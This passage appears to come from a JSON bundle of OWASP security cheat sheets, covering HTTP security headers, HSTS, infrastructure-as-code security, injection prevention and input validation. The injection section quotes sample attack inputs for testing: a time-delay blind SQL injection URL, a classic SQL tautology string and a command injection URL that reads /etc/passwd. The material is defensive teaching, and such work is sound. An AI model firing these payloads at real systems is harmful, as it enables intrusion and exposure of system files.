header.\r\n\r\n```javascript\r\nconst helmet = require('helmet');\r\nconst app = express();\r\n// Sets \"X-Frame-Options: SAMEORIGIN\"\r\napp.use(\r\n helmet.frameguard({\r\n   action: \"sameorigin\",\r\n })\r\n);\r\n```\r\n\r\n## Testing Proper Implementation of Security Headers\r\n\r\n### Mozilla Observatory\r\n\r\nThe [Mozilla Observatory](https://observatory.mozilla.org/) is an online tool which helps you to check your website's header status.\r\n\r\n### SmartScanner\r\n\r\n[SmartScanner](https://www.thesmartscanner.com/) has a dedicated [test profile](https://www.thesmartscanner.com/docs/configuring-security-tests) for testing security of HTTP headers.\r\nOnline tools usually test the homepage of the given address. But SmartScanner scans the whole website. So, you can make sure all of your web pages have the right HTTP Headers in place.\r\n\r\n## References\r\n\r\n- [Mozilla: X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)\r\n- [Mozilla: X-XSS-Protection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection)\r\n- [hstspreload.org](https://hstspreload.org/)\r\n- [Mozilla: Strict-Transport-Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security)\r\n- [Mozilla: Content-Type](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type)\r\n- [Mozilla: Expect-CT](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Expect-CT)\r\n- [Mozilla: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)\r\n- [content-security-policy.com](https://content-security-policy.com/)\r\n- [Mozilla: Cross-Origin-Opener-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Opener-Policy)\r\n- [resourcepolicy.fyi](https://resourcepolicy.fyi/)\r\n- [Mozilla: Cross-Origin-Resource-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Resource-Policy)\r\n- [Mozilla: Cross-Origin-Embedder-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Embedder-Policy)\r\n- [Mozilla: Server Header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Server)\r\n- [Linked OWASP project: Secure Headers Project](https://owasp.org/www-project-secure-headers/)\r\n"
    },
    {
      "HTTP_Strict_Transport_Security_Cheat_Sheet.md": "# HTTP Strict Transport Security Cheat Sheet\r\n\r\n## Introduction\r\n\r\nHTTP [Strict Transport Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security) (also named **HSTS**) is an opt-in security enhancement that is specified by a web application through the use of a special response header. Once a supported browser receives this header that browser will prevent any communications from being sent over HTTP to the specified domain and will instead send all communications over HTTPS. It also prevents HTTPS click through prompts on browsers.\r\n\r\nThe specification has been released and published end of 2012 as [RFC 6797](http://tools.ietf.org/html/rfc6797) (HTTP Strict Transport Security (HSTS)) by the IETF.\r\n\r\n## Threats\r\n\r\nHSTS addresses the following threats:\r\n\r\n- User bookmarks or manually types `http://example.com` and is subject to a man-in-the-middle attacker\r\n    - HSTS automatically redirects HTTP requests to HTTPS for the target domain\r\n- Web application that is intended to be purely HTTPS inadvertently contains HTTP links or serves content over HTTP\r\n    - HSTS automatically redirects HTTP requests to HTTPS for the target domain\r\n- A man-in-the-middle attacker attempts to intercept traffic from a victim user using an invalid certificate and hopes the user will accept the bad certificate\r\n    - HSTS does not allow a user to override the invalid certificate message\r\n\r\n## Examples\r\n\r\nSimple example, using a long (1 year = 31536000 seconds) max-age. This example is dangerous since it lacks `includeSubDomains`:\r\n\r\n`Strict-Transport-Security: max-age=31536000`\r\n\r\nThis example is useful if all present and future subdomains will be HTTPS. This is a more secure option but will block access to certain pages that can only be served over HTTP:\r\n\r\n`Strict-Transport-Security: max-age=31536000; includeSubDomains`\r\n\r\nThis example is useful if all present and future subdomains will be HTTPS. In this example we set a very short max-age in case of mistakes during initial rollout:\r\n\r\n`Strict-Transport-Security: max-age=86400; includeSubDomains`\r\n\r\n**Recommended:**\r\n\r\n- If the site owner would like their domain to be included in the [HSTS preload list](https://hstspreload.org) maintained by Chrome (and used by Firefox and Safari), then use the header below.\r\n- Sending the `preload` directive from your site can have **PERMANENT CONSEQUENCES** and prevent users from accessing your site and any of its subdomains if you find you need to switch back to HTTP. Please read the details at [preload removal](https://hstspreload.org/#removal) before sending the header with `preload`.\r\n\r\n`Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`\r\n\r\nThe `preload` flag indicates the site owner's consent to have their domain preloaded. The site owner still needs to then go and submit the domain to the list.\r\n\r\n## Problems\r\n\r\nSite owners can use HSTS to identify users without cookies. This can lead to a significant privacy leak. Take a look [here](http://www.leviathansecurity.com/blog/the-double-edged-sword-of-hsts-persistence-and-privacy) for more details.\r\n\r\nCookies can be manipulated from sub-domains, so omitting the `includeSubDomains` option permits a broad range of cookie-related attacks that HSTS would otherwise prevent by requiring a valid certificate for a subdomain. Ensuring the `secure` flag is set on all cookies will also prevent, some, but not all, of the same attacks.\r\n\r\n## Browser Support\r\n\r\nAs of September 2019 HSTS is supported by [all modern browsers](https://caniuse.com/#feat=stricttransportsecurity), with the only notable exception being Opera Mini.\r\n\r\n## References\r\n\r\n- [Chromium Projects/HSTS](https://www.chromium.org/hsts/)\r\n- [OWASP TLS Protection Cheat Sheet](Transport_Layer_Protection_Cheat_Sheet.md)\r\n- [sslstrip](https://github.com/moxie0/sslstrip)\r\n- [AppSecTutorial Series - Episode 4](https://www.youtube.com/watch?v=zEV3HOuM_Vw)\r\n- [Nmap NSE script to detect HSTS configuration](https://github.com/icarot/NSE_scripts/blob/master/http-hsts-verify.nse)\r\n"
    },
    {
      "Infrastructure_as_Code_Security_Cheat_Sheet.md": "<!---\r\nCopyright 2021 Nokia\r\nLicensed under the Creative Commons Attribution-ShareAlike 3.0 Unported License\r\nSPDX-License-Identifier: CC-BY-SA-3.0\r\n--->\r\n\r\n# Infrastructure as Code Security Cheatsheet\r\n\r\n## Introduction\r\n\r\nInfrastructure as code (IaC), also known as software-defined infrastructure, allows the configuration and deployment of infrastructure components faster with consistency by allowing them to be defined as a code and also enables repeatable deployments across environments.\r\n\r\n### Security best practices\r\n\r\nHere are some of the security best practices for IaC that can be easily integrated into the Software Development Lifecycle:\r\n\r\n### Develop and Distribute\r\n\r\n- IDE plugins - Leverage standard security plug-ins in the integrated development environment (IDE) which helps in the early detection of potential risks and drastically reduces the time to address any issues later in the development cycle. Plugins such as TFLint, Checkov, Docker Linter, docker-vulnerability-extension, Security Scan, Contrast Security, etc., help in the security assessment of the IaC.\r\n- Threat modelling - Build the threat modelling landscape earlier in the development cycle to ensure there is enough visibility of the high-risk, high-volume aspects of the code and flexibility to include security throughout to ensure the assets are safely managed.\r\n- Managing secrets -  Secrets are confidential data and information such as application tokens required for authentication, passwords, and SSH (Secure Shell) keys. The problem is not the secrets, but where you store them. If you are using a simple text file or SCMs like Git, then the secrets can be easily exposed. Open-source tools such as truffleHog, git-secrets, GitGuardian and similar can be utilized to detect such vulnerable management of secrets. See the [Secrets Management Cheat Sheet](Secrets_Management_Cheat_Sheet.md) for more information.\r\n- Version control - Version control is the practice of tracking and managing changes to software code. Ensure all the changes to the IaC are tracked with the right set of information that helps in any revert operation. The important part is that you’re checking in those changes alongside the features they support and not separately. A feature’s infrastructure requirements should be a part of a feature’s branch or merge request. Git is generally used as the source code version control system.\r\n- Principle of least privilege - define the access management policies based on the principle of least privilege with the following priority items:\r\n  \r\n    - Defining who is and is not authorized to create/update/run/delete the scripts and inventory.\r\n    - Limiting the permissions of authorized IaC users to what is necessary to perform their tasks. The IaC scripts should ensure that the permissions granted to the various resources it creates are limited to what is required for them to perform their work.\r\n\r\n- Static analysis - Analyzes code in isolation, identifying risks, misconfigurations, and compliance faults only relevant to the IaC itself. Tools such as kubescan, Snyk, Coverity etc, can be leveraged for static analysis of IaC.\r\n- Open Source dependency check - Analyzes the open source dependencies such as OS packages, libraries, etc., to identify potential risks. Tools such as BlackDuck, Snyk, WhiteSource Bolt for GitHub, and similar can be leveraged for open source dependency analysis of IaC.\r\n- Container image scan - Image scanning refers to the process of analyzing the contents and the build process of a container image in order to detect security issues, vulnerabilities or potential risks. Open-source tools such as Dagda, Clair, Trivy, Anchore, etc., can be leveraged for container image analysis.\r\nCI/CD pipeline and Consolidated reporting - enabling the security checks to be made available in the CI/CD pipeline enables the analysis of each of the code changes, excludes the need for manual intervention, and enables maintaining the history of compliance. Along with consolidated reporting, these integrations enhance the speed of development of a secure IaC codebase. Open-source tools such as Jenkins, etc., can be leveraged to build the CI/CD pipelines, and DefectDojo and OWASP Glue can help in tying the checks together and visualizing the check results in a single dashboard.\r\n- Artifact signing - Digital signing of artifacts at build time and validation of the signed data before use protects artifacts from tampering between build and runtime, thus ensuring the integrity and provenance of an artifact. Open-source tools such as TUF helps in the digital signing of artifacts.\r\n\r\n### Deploy\r\n\r\n- Inventory management:\r\n    - Commissioning - whenever a resource is deployed, ensure the resource is labeled, tracked and logged as part of the inventory management.\r\n    - Decommissioning - whenever a resource deletion is initiated, ensure the underlying configurations are erased, data is securely deleted and the resource is completely removed from the runtime as well as from the inventory management.\r\n    - Tagging - It is essential to tag cloud assets properly. During IaC operations, untagged assets are most likely to result in ghost resources that make it difficult to detect, visualize, and gain observability within the cloud environment and can affect the posture causing a drift. These ghost resources can add to billing costs, make maintenance difficult, and affect the reliability. The only solution to this is careful tagging and monitoring for untagged resources.\r\n- Dynamic analysis - Dynamic analysis helps in evaluating any existing environments and services that it will interoperate with or run on. This helps in uncovering potential risks due to the interoperability. Open-source tools such as ZAP, Burp, GVM, etc., can be leveraged for dynamic analysis.\r\n\r\n### Runtime\r\n\r\n- Immutability of infrastructure - The idea behind immutable infrastructure is to build the infrastructure components to an exact set of specifications. No deviation, no changes. If a change to a specification is required, then a whole new set of infrastructure is provisioned based on the updated requirements, and the previous infrastructure is taken out of service as obsolete.\r\n- Logging - Keeping a record is a critical aspect to keeping an eye on risks. You should enable logging - both security logs and audit logs - while provisioning infrastructure, as they help assess the security risks related to sensitive assets. They also assist in analyzing the root cause of incidents and in identifying potential threats. Open-source tools such as ELK, etc., can be leveraged for log analysis.\r\n- Monitoring - Continuous monitoring assists in looking out for any security and compliance violations, helps in identifying attacks and also provides alerts upon such incidents. Certain solutions also incorporate new technologies like AI to identify potential threats early. Open-source tools such as Prometheus, Grafana, etc., can be leveraged for monitoring of cloud infrastructure.\r\n- Runtime threat detection: Implementing a runtime threat detection solution helps in recognizing unexpected application behavior and alerts on threats at runtime. Open-source tools such as Falco, etc., can be leveraged for runtime threat detection. Certain application such as Contrast (Contrast Community Edition) can also detect OWASP Top 10 attacks on the application during runtime and help block them in order to protect and secure the application.\r\n\r\n## References\r\n\r\n- Securing Infrastructure as code: <https://www.opcito.com/blogs/securing-infrastructure-as-code>\r\n- Infrastructure as code security: <https://dzone.com/articles/infrastructure-as-code-security>\r\n- Shifting cloud security left with infrastructure as code: <https://securityboulevard.com/2020/04/shifting-cloud-security-left-with-infrastructure-as-code/>\r\n"
    },
    {
      "Injection_Prevention_Cheat_Sheet.md": "# Injection Prevention Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis article is focused on providing clear, simple, actionable guidance for preventing the entire category of Injection flaws in your applications. Injection attacks, especially [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection), are unfortunately very common.\r\n\r\nApplication accessibility is a very important factor in protection and prevention of injection flaws. Only the minority of all applications within a company/enterprise are developed in house, where as most applications are from external sources. Open source applications give at least the opportunity to fix problems, but closed source applications need a different approach to injection flaws.\r\n\r\nInjection flaws occur when an application sends untrusted data to an interpreter. Injection flaws are very prevalent, particularly in legacy code, often found in SQL queries, LDAP queries, XPath queries, OS commands, program arguments, etc. Injection flaws are easy to discover when examining code, but more difficult via testing. Scanners and fuzzers can help attackers find them.\r\n\r\nDepending on the accessibility different actions must be taken in order to fix them. It is always the best way to fix the problem in source code itself, or even redesign some parts of the applications. But if the source code is not available or it is simply uneconomical to fix legacy software only virtual patching makes sense.\r\n\r\n## Application Types\r\n\r\nThree classes of applications can usually be seen within a company. Those 3 types are needed to identify the actions which need to take place in order to prevent/fix injection flaws.\r\n\r\n### A1: New Application\r\n\r\nA new web application in the design phase, or in early stage development.\r\n\r\n### A2: Productive Open Source Application\r\n\r\nAn already productive application, which can be easily adapted. A Model-View-Controller (MVC) type application is just one example of having a easily accessible application architecture.\r\n\r\n### A3: Productive Closed Source Application\r\n\r\nA productive application which cannot or only with difficulty be modified.\r\n\r\n## Forms of Injection\r\n\r\nThere are several forms of injection targeting different technologies including SQL queries, LDAP queries, XPath queries and OS commands.\r\n\r\n### Query languages\r\n\r\nThe most famous form of injection is SQL Injection where an attacker can modify existing database queries. For more information see the [SQL Injection Prevention Cheat Sheet](SQL_Injection_Prevention_Cheat_Sheet.md).\r\n\r\nBut also LDAP, SOAP, XPath and REST based queries can be susceptible to injection attacks allowing for data retrieval or control bypass.\r\n\r\n#### SQL Injection\r\n\r\nAn SQL injection attack consists of insertion or \"injection\" of either a partial or complete SQL query via the data input or transmitted from the client (browser) to the web application.\r\n\r\nA successful SQL injection attack can read sensitive data from the database, modify database data (insert/update/delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file existing on the DBMS file system or write files into the file system, and, in some cases, issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.\r\n\r\nSQL Injection attacks can be divided into the following three classes:\r\n\r\n- **Inband:** data is extracted using the same channel that is used to inject the SQL code. This is the most straightforward kind of attack, in which the retrieved data is presented directly in the application web page.\r\n- **Out-of-band:** data is retrieved using a different channel (e.g., an email with the results of the query is generated and sent to the tester).\r\n- **Inferential or Blind:** there is no actual transfer of data, but the tester is able to reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server.\r\n\r\n##### How to test for the issue\r\n\r\n###### During code review\r\n\r\nplease check for any queries to the database are not done via prepared statements.\r\n\r\nIf dynamic statements are being made please check if the data is sanitized before used as par of the statement.\r\n\r\nAuditors should always look for uses of sp_execute, execute or exec within SQL Server stored procedures. Similar audit guidelines are necessary for similar functions for other vendors.\r\n\r\n###### Automated Exploitation\r\n\r\nMost of the situation and techniques below here can be performed in a automated way using some tools. In this article the tester can find information how to perform an automated auditing using [SQLMap](https://wiki.owasp.org/index.php/Automated_Audit_using_SQLMap)\r\n\r\nEqually Static Code Analysis Data flow rules can detect of unsanitized user controlled input can change the SQL query.\r\n\r\n###### Stored Procedure Injection\r\n\r\nWhen using dynamic SQL within a stored procedure, the application must properly sanitize the user input to eliminate the risk of code injection. If not sanitized, the user could enter malicious SQL that will be executed within the stored procedure.\r\n\r\n###### Time delay Exploitation technique\r\n\r\nThe time delay exploitation technique is very useful when the tester find a Blind SQL Injection situation, in which nothing is known on the outcome of an operation. This technique consists in sending an injected query and in case the conditional is true, the tester can monitor the time taken to for the server to respond. If there is a delay, the tester can assume the result of the conditional query is true. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section).\r\n\r\n```text\r\nhttp://www.example.com/product.php?id=10 AND IF(version() like '5%', sleep(10), 'false'))--\r\n```\r\n\r\nIn this example the tester is checking whether the MySql version is 5.x or not, making the server delay the answer by 10 seconds. The tester can increase the delay time and monitor the responses. The tester also doesn't need to wait for the response. Sometimes they can set a very high value (e.g. 100) and cancel the request after some seconds.\r\n\r\n###### Out of band Exploitation technique\r\n\r\nThis technique is very useful when the tester find a Blind SQL Injection situation, in which nothing is known on the outcome of an operation. The technique consists of the use of DBMS functions to perform an out of band connection and deliver the results of the injected query as part of the request to the tester's server. Like the error based techniques, each DBMS has its own functions. Check for specific DBMS section.\r\n\r\n##### Remediation\r\n\r\n###### Defense Option 1: Prepared Statements (with Parameterized Queries)\r\n\r\nPrepared statements ensure that an attacker is not able to change the intent of a query, even if SQL commands are inserted by an attacker. In the safe example below, if an attacker were to enter the userID of `tom' or '1'='1`, the parameterized query would not be vulnerable and would instead look for a username which literally matched the entire string `tom' or '1'='1`.\r\n\r\n###### Defense Option 2: Stored Procedures\r\n\r\nThe difference between prepared statements and stored procedures is that the SQL code for a stored procedure is defined and stored in the database itself, and then called from the application.\r\n\r\nBoth of these techniques have the same effectiveness in preventing SQL injection so your organization should choose which approach makes the most sense for you. Stored procedures are not always safe from SQL injection. However, certain standard stored procedure programming constructs have the same effect as the use of parameterized queries when implemented safely* which is the norm for most stored procedure languages.\r\n\r\n*Note:* 'Implemented safely' means the stored procedure does not include any unsafe dynamic SQL generation.\r\n\r\n###### Defense Option 3: Allow-List Input Validation\r\n\r\nVarious parts of SQL queries aren't legal locations for the use of bind variables, such as the names of tables or columns, and the sort order indicator (ASC or DESC). In such situations, input validation or query redesign is the most appropriate defense. For the names of tables or columns, ideally those values come from the code, and not from user parameters.\r\n\r\nBut if user parameter values are used to make different for table names and column names, then the parameter values should be mapped to the legal/expected table or column names to make sure unvalidated user input doesn't end up in the query. Please note, this is a symptom of poor design and a full rewrite should be considered if time allows.\r\n\r\n###### Defense Option 4: Escaping All User-Supplied Input\r\n\r\nThis technique should only be used as a last resort, when none of the above are feasible. Input validation is probably a better choice as this methodology is frail compared to other defenses and we cannot guarantee it will prevent all SQL Injection in all situations.\r\n\r\nThis technique is to escape user input before putting it in a query. It's usually only recommended to retrofit legacy code when implementing input validation isn't cost effective.\r\n\r\n##### Example code - Java\r\n\r\n###### Safe Java Prepared Statement Example\r\n\r\nThe following code example uses a `PreparedStatement`, Java's implementation of a parameterized query, to execute the same database query.\r\n\r\n```java\r\n// This should REALLY be validated too\r\nString custname = request.getParameter(\"customerName\");\r\n// Perform input validation to detect attacks\r\nString query = \"SELECT account_balance FROM user_data WHERE user_name = ?\";\r\nPreparedStatement pstmt = connection.prepareStatement(query);\r\npstmt.setString(1, custname);\r\nResultSet results = pstmt.executeQuery();\r\n```\r\n\r\nWe have shown examples in Java, but practically all other languages, including Cold Fusion, and Classic ASP, support parameterized query interfaces.\r\n\r\n###### Safe Java Stored Procedure Example\r\n\r\nThe following code example uses a `CallableStatement`, Java's implementation of the stored procedure interface, to execute the same database query. The `sp_getAccountBalance` stored procedure would have to be predefined in the database and implement the same functionality as the query defined above.\r\n\r\n```java\r\n// This should REALLY be validated\r\nString custname = request.getParameter(\"customerName\");\r\ntry {\r\n CallableStatement cs = connection.prepareCall(\"{call sp_getAccountBalance(?)}\");\r\n cs.setString(1, custname);\r\n ResultSet results = cs.executeQuery();\r\n // Result set handling...\r\n} catch (SQLException se) {\r\n // Logging and error handling...\r\n}\r\n```\r\n\r\n#### LDAP Injection\r\n\r\nLDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements through techniques similar to [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection). LDAP injection attacks could result in the granting of permissions to unauthorized queries, and content modification inside the LDAP tree. For more information on LDAP Injection attacks, visit [LDAP injection](https://owasp.org/www-community/attacks/LDAP_Injection).\r\n\r\n[LDAP injection](https://owasp.org/www-community/attacks/LDAP_Injection) attacks are common due to two factors:\r\n\r\n1. The lack of safer, parameterized LDAP query interfaces\r\n2. The widespread use of LDAP to authenticate users to systems.\r\n\r\n##### How to test for the issue\r\n\r\n###### During code review\r\n\r\nPlease check for any queries to the LDAP escape special characters, see [here](LDAP_Injection_Prevention_Cheat_Sheet.md#defense-option-1-escape-all-variables-using-the-right-ldap-encoding-function).\r\n\r\n###### Automated Exploitation\r\n\r\nScanner module of tool like OWASP [ZAP](https://www.zaproxy.org/) have module to detect LDAP injection issue.\r\n\r\n##### Remediation\r\n\r\n###### Escape all variables using the right LDAP encoding function\r\n\r\nThe main way LDAP stores names is based on DN ([distinguished name](https://ldapwiki.com/wiki/Distinguished%20Names)). You can think of this like a unique identifier. These are sometimes used to access resources, like a username.\r\n\r\nA DN might look like this\r\n\r\n```text\r\ncn=Richard Feynman, ou=Physics Department, dc=Caltech, dc=edu\r\n```\r\n\r\nor\r\n\r\n```text\r\nuid=inewton, ou=Mathematics Department, dc=Cambridge, dc=com\r\n```\r\n\r\nThere are certain characters that are considered special characters in a DN. The exhaustive list is the following: `\\ # + < > , ; \" =` and leading or trailing spaces\r\n\r\nEach DN points to exactly 1 entry, which can be thought of sort of like a row in a RDBMS. For each entry, there will be 1 or more attributes which are analogous to RDBMS columns. If you are interested in searching through LDAP for users will certain attributes, you may do so with search filters. In a search filter, you can use standard boolean logic to get a list of users matching an arbitrary constraint. Search filters are written in Polish notation AKA prefix notation.\r\n\r\nExample:\r\n\r\n```text\r\n(&(ou=Physics)(| (manager=cn=Freeman Dyson,ou=Physics,dc=Caltech,dc=edu)\r\n(manager=cn=Albert Einstein,ou=Physics,dc=Princeton,dc=edu) ))\r\n```\r\n\r\nWhen building LDAP queries in application code, you MUST escape any untrusted data that is added to any LDAP query. There are two forms of LDAP escaping. Encoding for LDAP Search and Encoding for LDAP DN (distinguished name). The proper escaping depends on whether you are sanitizing input for a search filter, or you are using a DN as a username-like credential for accessing some resource.\r\n\r\n##### Example code - Java\r\n\r\n###### Safe Java for LDAP escaping Example\r\n\r\n```java\r\npublic String escapeDN (String name) {\r\n //From RFC 2253 and the / character for JNDI\r\n final char[] META_CHARS = {'+', '\"', '<', '>', ';', '/'};\r\n String escapedStr = new String(name);\r\n //Backslash is both a Java and an LDAP escape character,\r\n //so escape it first\r\n escapedStr = escapedStr.replaceAll(\"\\\\\\\\\\\\\\\\\",\"\\\\\\\\\\\\\\\\\");\r\n //Positional characters - see RFC 2253\r\n escapedStr = escapedStr.replaceAll(\"\\^#\",\"\\\\\\\\\\\\\\\\#\");\r\n escapedStr = escapedStr.replaceAll(\"\\^ | $\",\"\\\\\\\\\\\\\\\\ \");\r\n for (int i=0 ; i < META_CHARS.length ; i++) {\r\n        escapedStr = escapedStr.replaceAll(\"\\\\\\\\\" +\r\n                     META_CHARS[i],\"\\\\\\\\\\\\\\\\\" + META_CHARS[i]);\r\n }\r\n return escapedStr;\r\n}\r\n```\r\n\r\nNote, that the backslash character is a Java String literal and a regular expression escape character.\r\n\r\n```java\r\npublic String escapeSearchFilter (String filter) {\r\n //From RFC 2254\r\n String escapedStr = new String(filter);\r\n escapedStr = escapedStr.replaceAll(\"\\\\\\\\\\\\\\\\\",\"\\\\\\\\\\\\\\\\5c\");\r\n escapedStr = escapedStr.replaceAll(\"\\\\\\\\\\*\",\"\\\\\\\\\\\\\\\\2a\");\r\n escapedStr = escapedStr.replaceAll(\"\\\\\\\\(\",\"\\\\\\\\\\\\\\\\28\");\r\n escapedStr = escapedStr.replaceAll(\"\\\\\\\\)\",\"\\\\\\\\\\\\\\\\29\");\r\n escapedStr = escapedStr.replaceAll(\"\\\\\\\\\" +\r\n               Character.toString('\\\\u0000'), \"\\\\\\\\\\\\\\\\00\");\r\n return escapedStr;\r\n}\r\n```\r\n\r\n#### XPath Injection\r\n\r\nTODO\r\n\r\n### Scripting languages\r\n\r\nAll scripting languages used in web applications have a form of an `eval` call which receives code at runtime and executes it. If code is crafted using unvalidated and unescaped user input code injection can occur which allows an attacker to subvert application logic and eventually to gain local access.\r\n\r\nEvery time a scripting language is used, the actual implementation of the 'higher' scripting language is done using a 'lower' language like C. If the scripting language has a flaw in the data handling code '[Null Byte Injection](http://projects.webappsec.org/w/page/13246949/Null%20Byte%20Injection)' attack vectors can be deployed to gain access to other areas in memory, which results in a successful attack.\r\n\r\n### Operating System Commands\r\n\r\nOS command injection is a technique used via a web interface in order to execute OS commands on a web server. The user supplies operating system commands through a web interface in order to execute OS commands.\r\n\r\nAny web interface that is not properly sanitized is subject to this exploit. With the ability to execute OS commands, the user can upload malicious programs or even obtain passwords. OS command injection is preventable when security is emphasized during the design and development of applications.\r\n\r\n#### How to test for the issue\r\n\r\n##### During code review\r\n\r\nCheck if any command execute methods are called and in unvalidated user input are taken as data for that command.\r\n\r\nOut side of that, appending a semicolon to the end of a URL query parameter followed by an operating system command, will execute the command. `%3B` is URL encoded and decodes to semicolon. This is because the `;` is interpreted as a command separator.\r\n\r\nExample: `http://sensitive/something.php?dir=%3Bcat%20/etc/passwd`\r\n\r\nIf the application responds with the output of the `/etc/passwd` file then you know the attack has been successful. Many web application scanners can be used to test for this attack as they inject variations of command injections and test the response.\r\n\r\nEqually Static Code Analysis tools check the data flow of untrusted user input into a web application and check if the data is then entered into a dangerous method which executes the user input as a command.\r\n\r\n#### Remediation\r\n\r\nIf it is considered unavoidable the call to a system command incorporated with user-supplied, the following two layers of defense should be used within software in order to prevent attacks\r\n\r\n1. **Parameterization** - If available, use structured mechanisms that automatically enforce the separation between data and command. These mechanisms can help to provide the relevant quoting, encoding.\r\n2. **Input validation** - the values for commands and the relevant arguments should be both validated. There are different degrees of validation for the actual command and its arguments:\r\n    - When it comes to the **commands** used, these must be validated against a list of allowed commands.\r\n    - In regards to the **arguments** used for these commands, they should be validated using the following options:\r\n        - Positive or \"allow list\" input validation - where are the arguments allowed explicitly defined\r\n        - Allow-list Regular Expression - where is explicitly defined a list of good characters allowed and the maximum length of the string. Ensure that metacharacters like `& | ; $ > < \\` \\ !` and white-spaces are not part of the Regular Expression. For example, the following regular expression only allows lowercase letters and numbers, and does not contain metacharacters. The length is also being limited to 3-10 characters:\r\n\r\n`^[a-z0-9]{3,10}$`\r\n\r\n#### Example code - Java\r\n\r\n##### Incorrect Usage\r\n\r\n```java\r\nProcessBuilder b = new ProcessBuilder(\"C:\\DoStuff.exe -arg1 -arg2\");\r\n```\r\n\r\nIn this example, the command together with the arguments are passed as a one string, making easy to manipulate that expression and inject malicious strings.\r\n\r\n##### Correct Usage\r\n\r\nHere is an example that starts a process with a modified working directory. The command and each of the arguments are passed separately. This make it easy to validated each term and reduces the risk to insert malicious strings.\r\n\r\n```java\r\nProcessBuilder pb = new ProcessBuilder(\"TrustedCmd\", \"TrustedArg1\", \"TrustedArg2\");\r\nMap<String, String> env = pb.environment();\r\npb.directory(new File(\"TrustedDir\"));\r\nProcess p = pb.start();\r\n```\r\n\r\n### Network Protocols\r\n\r\nWeb applications often communicate with network daemons (like SMTP, IMAP, FTP) where user input becomes part of the communication stream. Here it is possible to inject command sequences to abuse an established session.\r\n\r\n## Injection Prevention Rules\r\n\r\n### Rule \\#1 (Perform proper input validation)\r\n\r\nPerform proper input validation. Positive or \"allow list\" input validation with appropriate canonicalization is also recommended, but **is not a complete defense** as many applications require special characters in their input.\r\n\r\n### Rule \\#2 (Use a safe API)\r\n\r\nThe preferred option is to use a safe API which avoids the use of the interpreter entirely or provides a parameterized interface. Be careful of APIs, such as stored procedures, that are parameterized, but can still introduce injection under the hood.\r\n\r\n### Rule \\#3 (Contextually escape user data)\r\n\r\nIf a parameterized API is not available, you should carefully escape special characters using the specific escape syntax for that interpreter.\r\n\r\n## Other Injection Cheatsheets\r\n\r\n[SQL Injection Prevention Cheat Sheet](SQL_Injection_Prevention_Cheat_Sheet.md)\r\n\r\n[OS Command Injection Defense Cheat Sheet](OS_Command_Injection_Defense_Cheat_Sheet.md)\r\n\r\n[LDAP Injection Prevention Cheat Sheet](LDAP_Injection_Prevention_Cheat_Sheet.md)\r\n\r\n[Injection Prevention Cheat Sheet in Java](Injection_Prevention_in_Java_Cheat_Sheet.md)\r\n"
    },
    {
      "Injection_Prevention_in_Java_Cheat_Sheet.md": "# Injection Prevention Cheat Sheet in Java\r\n\r\nThis information has been moved to the dedicated [Java Security CheatSheet](Java_Security_Cheat_Sheet.md#injection-prevention-in-java)\r\n"
    },
    {
      "Input_Validation_Cheat_Sheet.md": "# Input Validation Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis article is focused on providing clear, simple, actionable guidance for providing Input Validation security functionality in your applications.\r\n\r\n## Goals of Input Validation\r\n\r\nInput validation is performed to ensure only properly formed data is entering the workflow in an information system, preventing malformed data from persisting in the database and triggering malfunction of various downstream components. Input validation should happen as early as possible in the data flow, preferably as soon as the data is received from the external party.\r\n\r\nData from all potentially untrusted sources should be subject to input validation, including not only Internet-facing web clients but also backend feeds over extranets, from [suppliers, partners, vendors or regulators](https://badcyber.com/several-polish-banks-hacked-information-stolen-by-unknown-attackers/), each of which may be compromised on their own and start sending malformed data.\r\n\r\nInput Validation should not be used as the *primary* method of preventing [XSS](Cross_Site_Scripting_Prevention_Cheat_Sheet.md), [SQL Injection](SQL_Injection_Prevention_Cheat_Sheet.md) and other attacks which are covered in respective [cheat sheets](https://cheatsheetseries.owasp.org/) but can significantly contribute to reducing their impact if implemented properly.\r\n\r\n## Input validation strategies\r\n\r\nInput validation should be applied on both **syntactical** and **Semantic** level.\r\n\r\n**Syntactic** validation should enforce correct syntax of structured fields (e.g. SSN, date, currency symbol).\r\n\r\n**Semantic** validation should enforce correctness of their *values* in the specific business context (e.g. start date is before end date, price is within expected range).\r\n\r\nIt is always recommended to prevent attacks as early as possible in the processing of the user's (attacker's) request. Input validation can be used to detect unauthorized input before it is processed by the application.\r\n\r\n## Implementing input validation\r\n\r\nInput validation can be implemented using any programming technique that allows effective enforcement of syntactic and semantic correctness, for example:\r\n\r\n- Data type validators available natively in web application frameworks (such as [Django Validators](https://docs.djangoproject.com/en/1.11/ref/validators/), [Apache Commons Validators](https://commons.apache.org/proper/commons-validator/apidocs/org/apache/commons/validator/package-summary.html#doc.Usage.validator) etc).\r\n- Validation against [JSON Schema](http://json-schema.org/) and [XML Schema (XSD)](https://www.w3schools.com/xml/schema_intro.asp) for input in these formats.\r\n- Type conversion (e.g. `Integer.parseInt()` in Java, `int()` in Python) with strict exception handling\r\n- Minimum and maximum value range check for numerical parameters and dates, minimum and maximum length check for strings.\r\n- Array of allowed values for small sets of string parameters (e.g. days of week).\r\n- Regular expressions for any other structured 